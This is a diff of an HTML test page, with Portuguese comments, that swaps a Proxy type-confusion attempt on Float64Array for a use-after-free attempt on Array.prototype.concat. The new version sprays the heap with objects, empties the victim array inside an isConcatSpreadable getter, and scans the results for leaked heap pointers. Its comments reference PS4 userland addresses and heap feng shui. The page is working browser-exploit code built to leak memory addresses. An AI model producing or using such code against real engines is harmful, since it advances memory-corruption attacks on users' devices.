@@ -1,17 +1,18 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Proxy Trap Type Confusion</title>
+    <title>Concat UAF: Stale Memory Hunter</title>
     <style>
-        body { background: #111; color: #0f0; font-family: monospace; padding: 20px; }
-        #log { border: 1px solid #333; padding: 10px; min-height: 200px; }
+        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
+        #log { border: 1px solid #333; padding: 10px; min-height: 300px; white-space: pre-wrap; }
         .win { color: #0f0; font-weight: bold; font-size: 1.3em; border: 1px solid #0f0; padding: 5px; }
         .fail { color: #555; }
+        .info { color: #0ff; }
     </style>
 </head>
 <body>
-    <h2>Proxy Trap: Tentando Confusão de Tipos</h2>
-    <p>Objetivo: Fazer o construtor tratar um Objeto como um Double.</p>
+    <h2>Concat UAF: Caçando VTable</h2>
+    <p>Tentando substituir memória morta por um Objeto para vazar o ponteiro.</p>
     <div id="log">Iniciando...</div>
 
     <script>
@@ -20,89 +21,98 @@
             el.innerHTML += `<div class="${type}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
         }
 
-        // Conversor Float64 <-> BigInt64 (Hex)
+        // Helpers de Conversão
         const buf = new ArrayBuffer(8);
         const f64 = new Float64Array(buf);
-        const u64 = new BigUint64Array(buf);
+        const u32 = new Uint32Array(buf);
 
-        function f2h(val) {
+        function d2h(val) {
             f64[0] = val;
-            let hex = u64[0].toString(16);
-            return "0x" + hex.padStart(16, '0');
+            let lo = u32[0];
+            let hi = u32[1];
+            return `0x${hi.toString(16).padStart(8,'0')}${lo.toString(16).padStart(8,'0')}`;
         }
 
-        // O Objeto que queremos vazar o endereço
-        // Pode ser qualquer coisa, mas um objeto com propriedades inline é bom
-        var targetObj = {a: 1, b: 2, c: 3, d: 4}; 
+        // Variáveis Globais
+        var spray = [];
+        var targetArray = [];
 
         function runExploit() {
             try {
-                log("1. Criando Proxy Malicioso...");
+                log("1. Configurando Spray de Memória...", 'info');
 
-                // Este array serve apenas para enganar o JIT/Alocador
-                const dummy = [1.1, 2.2, 3.3];
+                // Prepara objetos para ocupar o espaço liberado
+                // Usamos objetos com propriedades inline para ter estrutura previsível
+                for(let i=0; i<5000; i++) {
+                    spray.push({a: 1, b: 2, c: 3, d: 4});
+                }
 
-                const proxy = new Proxy(dummy, {
-                    get(target, prop, receiver) {
-                        // Se o construtor pedir o tamanho, dizemos 2
-                        if (prop === "length") return 2;
+                // O Array que será esvaziado (Vítima)
+                // Usamos Floats para alinhar com Double pointers
+                targetArray = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
+
+                // O Gatilho
+                let hole = {
+                    length: 20, // Dizemos que vamos ler 20 itens (OOB)
+                    [Symbol.isConcatSpreadable]: true,
+                    get 0() {
+                        // O MOMENTO CRÍTICO
+                        log("   -> Gatilho ativado! Esvaziando array...", 'info');
                         
-                        // O acesso ao índice 0 é normal
-                        if (prop === "0") return 1337.0;
-
-                        // O GOLPE (Índice 1):
-                        // Quando ele pedir o segundo elemento, retornamos o OBJETO ALVO.
-                        // Um motor seguro daria erro ou converteria para NaN.
-                        // Um motor vulnerável grava o PONTEIRO.
-                        if (prop === "1") {
-                            log("   -> Trap ativado! Entregando Objeto em vez de Float...");
-                            return targetObj; 
+                        // 1. Libera a memória do targetArray
+                        targetArray.length = 0; 
+                        
+                        // 2. Tenta preencher o vácuo IMEDIATAMENTE com objetos
+                        // Criamos milhares de objetos novos na esperança de que um caia
+                        // exatamente onde o targetArray estava.
+                        let fill = [];
+                        for(let k=0; k<10000; k++) {
+                            fill.push({p: 1337}); // Objeto simples
                         }
+                        
+                        // Guarda referência para não ser coletado
+                        spray.push(fill);
 
-                        return Reflect.get(target, prop, receiver);
+                        return 100.0; // Marcador
                     }
-                });
+                };
 
-                log("2. Disparando new Float64Array(proxy)...");
+                log("2. Disparando concat()...");
                 
-                // A mágica acontece aqui
-                const arr = new Float64Array(proxy);
+                // Executa a vulnerabilidade
+                let res = targetArray.concat(hole);
 
-                log("3. Verificando resultados...");
+                log("3. Analisando vazamentos...", 'info');
                 
-                // O índice 0 deve ser 1337
-                // O índice 1 deve ser NaN (seguro) ou um Ponteiro Gigante (VULNERÁVEL)
-                let val0 = arr[0];
-                let val1 = arr[1];
-
-                log(`   Index 0: ${val0}`);
-                log(`   Index 1: ${val1} (Hex: ${f2h(val1)})`);
-
-                // Análise do Resultado
-                if (Number.isNaN(val1)) {
-                    log("[-] Falha: O objeto foi convertido para NaN corretamente.", 'fail');
-                } else if (val1 === 0) {
-                    log("[-] Falha: O objeto virou 0.", 'fail');
-                } else {
-                    // Se não é NaN e não é 0, e nós passamos um objeto...
-                    // É muito provável que seja um endereço de memória!
-                    let hex = f2h(val1);
+                let found = false;
+                for(let i=0; i<res.length; i++) {
+                    let val = res[i];
                     
-                    // Ponteiros de Userland no PS4 geralmente parecem com:
-                    // 0x00000008xxxxxxxx (Comprimido/Estrutura) ou 0x00007fxxxxxxxxxx
+                    // Ignora undefined e nossos marcadores
+                    if (val === undefined) continue;
+                    if (val === 100.0) continue;
+                    
+                    // Se acharmos algo que NÃO é 1.1, 2.2... (os originais)
+                    // E que parece um ponteiro...
+                    let hex = d2h(val);
+                    
+                    // Ponteiros Userland (Heap)
                     if (hex.startsWith("0x0000")) {
-                        log(`[+] JACKPOT! ISSO PARECE UM PONTEIRO: ${hex}`, 'win');
-                        log("    Endereço do objeto vazado com sucesso!", 'win');
-                    } else {
-                        log(`[?] Resultado estranho: ${hex}. Pode ser um float comprimido?`, 'win');
+                         if (val < 1000 && val > -1000) continue; // Ignora floats pequenos residuais
+
+                         log(`[!!!] LEAK CANDIDATE [Index ${i}]: ${hex}`, 'win');
+                         log(`      Valor Float: ${val}`, 'win');
+                         found = true;
                     }
+                }
+
+                if (!found) {
+                    log("[-] Falha: Leu apenas undefined ou valores limpos.", 'fail');
+                    log("    Tente rodar novamente. Feng Shui é questão de sorte.", 'info');
                 }
 
             } catch(e) {
-                log("Erro Fatal: " + e.message);
-                if (e.message.includes("Cannot convert")) {
-                    log("[-] O motor bloqueou a conversão de Objeto para Número.", 'fail');
-                }
+                log("Erro Fatal: " + e.message, 'fail');
             }
         }
 
